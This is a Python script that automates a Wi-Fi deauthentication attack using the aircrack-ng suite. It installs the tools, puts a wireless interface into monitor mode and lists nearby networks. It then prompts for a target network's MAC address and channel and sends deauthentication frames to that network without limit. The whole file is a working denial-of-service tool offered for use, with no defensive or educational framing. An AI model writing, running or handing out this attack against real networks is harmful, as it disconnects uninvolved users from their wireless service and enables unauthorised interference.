import subprocess
import os
import sys

#Script prerequisites
if len(sys.argv) != 2:
    print("Usage: python main.py <interface>")
    sys.exit(1)

if os.geteuid() != 0:
    print("This script must be run as root.")
    sys.exit()

#Set const variables
INTERFACE = sys.argv[1]
MONITOR_INTERFACE = INTERFACE + "mon"


def install_packages():
    # Package update
    try:
        subprocess.run(["apt", "update"], check=True)
        subprocess.run(["apt", "install", "-y", "aircrack-ng"], check=True)
        print("Packages Updated")
    except subprocess.CalledProcessError as e:
        print(f"Error: updating packages {e}")
        sys.exit(1)

def monitor_mode_on():
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["airmon-ng", "start", INTERFACE])

def select_target():
    try:
        print("Press Ctrl+C to stop")
        subprocess.run(["airodump-ng", MONITOR_INTERFACE])
    except KeyboardInterrupt:
        pass
    mac_address =  input("Please enter the MAC address of the target wifi network: ")
    channel = input("Please enter the channel number of the target wifi network: ")
    return mac_address, channel

def attack():
    try:
        subprocess.run(["iwconfig", MONITOR_INTERFACE, "down"], check=True)
        subprocess.run(["iwconfig", MONITOR_INTERFACE, "channel", wifi_channel], check=True)
        subprocess.run(["iwconfig", MONITOR_INTERFACE, "up"], check=True)
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", selected_wifi_mac, MONITOR_INTERFACE])
    except KeyboardInterrupt:
        print("Stopping...")
        sys.exit()


#Run everything
install_packages()
monitor_mode_on()
selected_wifi_mac, wifi_channel = select_target()
attack()